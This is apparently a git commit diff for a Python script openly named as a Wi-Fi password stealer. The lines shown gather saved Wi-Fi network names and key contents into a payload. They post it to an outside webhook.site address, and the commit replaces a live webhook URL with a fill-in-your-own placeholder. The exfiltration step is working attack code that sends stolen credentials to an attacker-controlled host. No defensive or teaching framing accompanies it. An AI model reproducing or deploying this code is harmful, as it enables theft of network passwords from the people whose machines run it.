00a5576450c869b5a88cee7541a729e7487decf2
Ahmed Qadir <92455682+ahmedqadir555@users.noreply.github.com>
2024-05-17 15:34:25 +0500

    wifi_password_stealer-webhook.py

--- wifi_webhook_profile_and_password.py
+++ wifi_webhook_profile_and_password.py
@@ -25,6 +25,6 @@ for profile_name in profile_names:
 payload = {'profiles': '\n'.join([f"\nSSID: {ssid}\nKey Content: {key_content}\n" for ssid, key_content in wifi_info.items()])}
 
 # Send data through Webhook.site
-response = requests.post('https://webhook.site/cef5a05c-4203-45fd-9717-4d1d49acbcc5', data=payload)
+response = requests.post('ENTER YOUR webhook.site URL HERE', data=payload)
 
 print(response.text)  # Print the response from the webhook
